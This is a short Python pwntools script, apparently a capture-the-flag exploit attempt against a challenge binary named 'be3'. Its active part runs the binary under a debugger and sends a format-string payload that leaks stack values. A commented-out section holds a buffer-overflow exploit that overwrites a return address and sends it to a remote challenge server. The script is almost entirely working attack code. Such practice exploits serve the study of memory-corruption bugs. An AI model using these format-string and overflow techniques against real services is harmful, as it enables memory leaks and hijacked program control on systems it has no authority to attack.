#!/usr/bin/env python3

from pwn import *

# exe = ELF("./be3", checksec=False)

# context.binary = exe
context.gdb_binary = "pwndbg"
context.terminal = ['kitty', '@', 'launch', '--location=vsplit', '--allow-remote-control']

io = gdb.debug(
'./be3', 
env={'SHELL': '/bin/sh'},
gdbscript='''
    b *main
    continue
''')

pause()

payload = b" ".join(f"%{i}$p".encode() for i in range(1, 20))
io.sendline(payload)

io.interactive()

# def conn():
#     if args.LOCAL:
#         r = process([exe.path])
#         if args.GDB:
#             gdb.attach(r)
#     else:
#         r = remote("51.79.201.156", 7015)
#
#     return r
#
#
# def main():
#     r = conn()
#
#     # good luck pwning :)
#     offset = 127
#     target_address = 0x40122d
#     payload = b"A" * offset + p32(target_address)
#
#     r.sendline(payload)
#     r.interactive()
#
#
# if __name__ == "__main__":
#     main()
